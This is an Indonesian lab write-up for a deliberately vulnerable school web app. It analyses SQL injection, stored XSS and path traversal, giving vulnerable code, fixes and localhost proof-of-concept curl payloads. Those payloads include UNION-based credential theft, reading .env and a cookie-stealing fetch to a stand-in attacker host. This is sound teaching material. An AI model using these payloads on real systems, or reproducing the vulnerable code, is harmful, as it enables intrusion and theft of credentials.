# 📄 Dokumen Analisis Keamanan — Website Profil XI TKJ 3

> Media praktikum keamanan aplikasi web. Dokumen ini menganalisis tiga kerentanan yang
> sengaja ditanam pada **versi rentan** (`SECURE_MODE=0`) beserta perbaikannya pada
> **versi aman** (`SECURE_MODE=1`).

| Kerentanan | Lokasi | Endpoint | Kode |
|---|---|---|---|
| A. SQL Injection | Fitur pencarian & parameter id | `GET /api/siswa/search?q=`, `/siswa?q=`, `/siswa/[id]` | `lib/siswa.js` |
| B. XSS (Stored) | Komentar / buku tamu profil | `POST, GET /api/komentar`, halaman `/siswa/[id]` | `lib/siswa.js`, `components/CommentSection.js` |
| C. Path Traversal | Penyaji foto siswa | `GET /api/foto?file=` | `app/api/foto/route.js` |

---

## A. SQL Injection

### 1. Identifikasi

Fitur **pencarian siswa** (halaman *Daftar Siswa* dan API `GET /api/siswa/search?q=…`)
serta **parameter `id`** pada halaman profil. Keduanya mengambil data dari database
berdasarkan input pengguna tanpa pemisahan antara *kode SQL* dan *data*.

### 2. Penyebab

Input pengguna digabung langsung (string concatenation) ke dalam query:

```js
// lib/siswa.js — VERSI RENTAN
const sql = `SELECT ${KOLOM} FROM siswa
  WHERE nama_lengkap LIKE '%${q}%' OR nama_panggilan LIKE '%${q}%' OR keahlian LIKE '%${q}%'
  ORDER BY id`;
const [rows] = await getPool().query(sql);
```

Query yang dihasilkan untuk `q = ' OR 1=1 -- -`:

```sql
SELECT ... FROM siswa
WHERE nama_lengkap LIKE '%' OR 1=1 -- -%' OR ...
                     ^^^^^^^^  input menjadi BAGIAN SINTAKS SQL
```

Tanda kutip `'` dari pengguna menutup string SQL lebih awal, sisanya dieksekusi
sebagai kondisi baru. Basis data tidak punya cara membedakan mana data asli dan mana
perintah penyerang.

### 3. Dampak

| Dampak | Bukti pada aplikasi ini |
|---|---|
| Kebocoran seluruh data tabel | `q=' OR 1=1 -- -` → 24 siswa dikembalikan meski kata kunci tidak cocok |
| Pembacaan tabel lain (UNION) | `q=' UNION SELECT … FROM users-- -` → username & password guru bocor (`admin/admin123`, `guru.tkj/guru456`) |
| Kebocoran informasi (error-based) | `q='` → pesan error MariaDB beserta potongan SQL dikirim ke klien, memandu penyerang |
| Pada konfigurasi lain | Modifikasi/penghapusan data (jika `multipleStatements` aktif), potensi RCE pada DB tertentu |

### 4. Proof of Concept

```bash
# 1. Boolean-based — semua data keluar
curl -G "http://localhost:3000/api/siswa/search" --data-urlencode "q=' OR 1=1 -- -"

# 2. UNION-based — mencuri kredensial tabel users
curl -G "http://localhost:3000/api/siswa/search" \
  --data-urlencode "q=' UNION SELECT 1, username, '-', 'XI TKJ 3', password, '', '', '', 'kredensial guru', '' FROM users-- -"

# 3. Error-based — error SQL bocor
curl -G "http://localhost:3000/api/siswa/search" --data-urlencode "q='"
```

Atau lewat antarmuka: isi kotak pencarian di halaman *Daftar Siswa* dengan
`' OR 1=1 -- -` lalu tekan **Search** — hasil pencarian menampilkan seluruh siswa.
Dengan payload UNION, kartu siswa palsu berisi username/password guru muncul di antara hasil.

### 5. Perbaikan

**Parameterized query / prepared statement** — input dikirim terpisah sebagai *nilai
parameter*, sehingga tidak pernah diinterpretasi sebagai sintaks SQL:

```js
// lib/siswa.js — VERSI AMAN
const like = `%${q}%`;
const [rows] = await getPool().execute(
  `SELECT ${KOLOM} FROM siswa
     WHERE nama_lengkap LIKE ? OR nama_panggilan LIKE ? OR keahlian LIKE ?
     ORDER BY id`,
  [like, like, like]
);
```

Perbaikan tambahan yang diterapkan:

- `getSiswaById()`: id dipaksa ke angka (`Number(id)`) **dan** dikirim sebagai parameter.
- `tambahKomentar()` versi aman juga memakai prepared statement (versi rentan rentan SQLi di 3 titik).
- Error database tidak lagi dikirim ke klien (cukup di-log server) → memutus error-based SQLi.

### 6. Verifikasi setelah perbaikan

`SECURE_MODE=1` → ketiga payload di atas menghasilkan **0 hasil** (payload diperlakukan
sebagai teks biasa yang dicari); tidak ada error SQL yang bocor; pencarian normal
(mis. `Bagas`) tetap berfungsi.

---

## B. Cross-Site Scripting (XSS — Stored)

### 1. Identifikasi

Fitur **komentar / buku tamu** pada halaman profil siswa. Input disimpan ke database
lalu ditampilkan kembali ke setiap pengunjung halaman profil tersebut.

### 2. Penyebab

Dua kesalahan sekaligus:

```js
// 1) Server: input disimpan MENTAH — tanpa validasi & tanpa sanitasi (lib/siswa.js)
const sql = `INSERT INTO komentar (siswa_id, penulis, isi)
  VALUES (${idRaw}, '${penulis}', '${isi}')`;

// 2) Browser: output dirender sebagai HTML mentah (components/CommentSection.js)
<div dangerouslySetInnerHTML={{ __html: String(k.isi ?? "") }} />
```

Karena tidak ada **output encoding**, string dari pengguna diperlakukan sebagai HTML.
Tag `<img src=x onerror=alert(1)>` milik penyerang dieksekusi oleh browser setiap
pengunjung yang membuka profil.

> Catatan menarik: `<script>alert(1)</script>` **tidak** dieksekusi via
> `innerHTML`/`dangerouslySetInnerHTML` (spesifikasi HTML tidak menjalankan `<script>`
> yang disisipkan lewat innerHTML), tetapi event handler seperti `onerror`, `onload`,
> atau `<svg onload=…>` tetap dieksekusi. Jangan merasa aman hanya karena payload
> `<script>` "tidak jalan".

### 3. Dampak

- **Pencurian sesi/cookie** pengunjung: `onerror=fetch('http://penyerang/?c='+document.cookie)`.
- **Keylogger / form palsu** di halaman resmi sekolah (phishing yang meyakinkan).
- **Defacement** halaman profil, redirect otomatis ke situs jahat.
- Menyebar ke semua pengunjung profil — satu komentar, banyak korban (Stored, bukan Reflected).

### 4. Proof of Concept

```bash
curl -X POST http://localhost:3000/api/komentar \
  -H "Content-Type: application/json" \
  -d '{"siswa_id":1,"penulis":"attacker","isi":"<img src=x onerror=alert(1)>"}'
```

Buka `http://localhost:3000/siswa/1` → dialog `alert(1)` muncul di browser **setiap
kali halaman dimuat**. (Telah diverifikasi langsung di browser: alert terpicu.)

Bonus: mengirim payload yang mengandung tanda kutip, mis. `alert('XSS')`, menyebabkan
**error SQL** — bukti bahwa titik ini juga rentan SQL Injection.

### 5. Perbaikan (pertahanan berlapis)

| Lapisan | Implementasi pada versi aman |
|---|---|
| Validasi input | Komentar wajib ada, maks. 500 karakter; nama maks. 100 karakter; `siswa_id` harus bilangan bulat positif |
| Sanitasi input | Komentar **tidak mengizinkan HTML sama sekali** — semua tag dihapus (`replace(/<[^>]*>/g, "")`). Jika kelak perlu rich-text, gunakan library sanitasi (DOMPurify), bukan regex buatan sendiri |
| Query aman | Penyimpanan memakai parameterized query |
| Output encoding | Komentar dirender sebagai **teks biasa** (`{k.isi}`) — React otomatis meng-escape `<`, `>`, `&`, `"`. `dangerouslySetInnerHTML` dihapus |

### 6. Verifikasi setelah perbaikan

`SECURE_MODE=1` → payload yang sama tersimpan sebagai teks polos, tampil apa adanya
(`&lt;img src=x …&gt;`), dan **tidak ada dialog alert** yang muncul. Komentar kosong /
melebihi 500 karakter ditolak dengan pesan jelas (HTTP 400).

---

## C. Path Traversal

### 1. Identifikasi

Endpoint penyaji foto `GET /api/foto?file=<nama file>` — dipakai untuk foto siswa dan
foto kelas. Server membaca file dari folder `data/foto/` menggunakan nama file dari
query string.

### 2. Penyebab

```js
// app/api/foto/route.js — VERSI RENTAN
const file = request.nextUrl.searchParams.get("file");
const filePath = path.join(FOTO_DIR, file);   // tanpa validasi apa pun
const data = await fs.readFile(filePath);
```

`path.join()` tidak melakukan pembatasan direktori. Urutan `../` (atau `..\` di Windows)
dari input pengguna "naik" keluar dari folder foto, sehingga aplikasi membaca file
apa pun yang bisa diakses proses server.

### 3. Dampak terhadap file di server

- Membaca **`.env`** → kredensial database bocor (terbukti: isi `.env` aplikasi ini keluar lewat payload).
- Membaca **source code & konfigurasi** (`package.json`, file lain di project).
- Membaca **file di luar project** pada drive yang sama — cukup menambah `../` sesuai kedalaman folder.
- Pada server produksi: berkas kunci SSH, log, backup database — pintu masuk ke kompromi yang lebih dalam.

### 4. Proof of Concept

```bash
# Membocorkan isi .env (kredensial DB)
curl "http://localhost:3000/api/foto?file=..%5C..%5C.env"

# Membaca source code
curl "http://localhost:3000/api/foto?file=..%5C..%5Cpackage.json"

# Variasi encoding umum: ..%2f..%2f  ....//....//  ..%252f
```

`%5C` adalah `\` yang di-URL-encode. Versi rentan juga membocorkan **path absolut
server** pada respons error (`File tidak ditemukan: D:\…\data\foto\…`) — informasi
berharga bagi penyerang.

### 5. Perbaikan

```js
// app/api/foto/route.js — VERSI AMAN
const nama = path.basename(file);
// 1) Validasi nama file: wajib nama sederhana — tolak "../", path absolut, dotfile
if (!file || nama !== file || file.includes("..") || nama.startsWith("."))
  return new Response("Nama file tidak diizinkan.", { status: 400 });

// 2) Whitelist ekstensi gambar
if (!MIME[path.extname(nama).toLowerCase()])
  return new Response("Format file tidak diizinkan.", { status: 400 });

// 3) Pembatasan direktori: hasil resolve wajib tetap di dalam folder foto
const resolved = path.resolve(FOTO_DIR, nama);
if (!resolved.startsWith(FOTO_DIR + path.sep))
  return new Response("Nama file tidak diizinkan.", { status: 400 });

const data = await fs.readFile(resolved);
```

Prinsip: **jangan pernah memakai input pengguna untuk membentuk path yang melewati
batas direktori**, dan **whitelist** (bukan blacklist). Error juga dibuat generik
 agar path server tidak bocor.

### 6. Verifikasi setelah perbaikan

`SECURE_MODE=1` → semua payload traversal dibalas **HTTP 400** (`Nama file tidak
diizinkan.`), file `.env` tidak terbaca, dan foto sah (`siswa-01.svg`, `foto-kelas.svg`)
tetap tampil normal.

---

## Temuan tambahan (nilai plus untuk analisis)

1. **Password disimpan plaintext** pada tabel `users` — praktik nyata harus pakai hash (bcrypt/argon2).
2. **Pesan error database dibocorkan ke klien** pada mode rentan (mempercepat SQLi error-based).
3. **Kredensial di `.env`** dapat terbaca lewat Path Traversal → kredensial harus dipisah per-lingkungan dan aplikasi tidak boleh membaca file di luar kebutuhan.
4. **`dangerouslySetInnerHTML`** adalah sumber XSS paling umum di React — hindari kecuali konten sudah disanitasi library tepercaya.
5. Catatan etika: semua pengujian hanya sah pada **aplikasi milik sendiri di localhost**. Menguji sistem orang lain tanpa izin melanggar hukum (UU ITE).
